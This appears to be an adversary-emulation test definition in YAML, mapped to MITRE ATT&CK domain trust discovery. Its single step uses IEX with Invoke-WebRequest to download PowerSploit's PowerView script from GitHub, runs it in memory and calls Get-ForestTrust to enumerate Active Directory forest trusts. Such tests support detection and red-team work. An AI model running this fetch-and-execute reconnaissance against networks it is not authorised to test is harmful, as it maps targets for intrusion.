@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: Get-ForestTrust with PowerView
+description: |
+    Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.
+uuid: 58ed10e8-0738-4651-8408-3a3e9a526279
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1482: Domain Trust Discovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: get-foresttrust-with-powerview
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
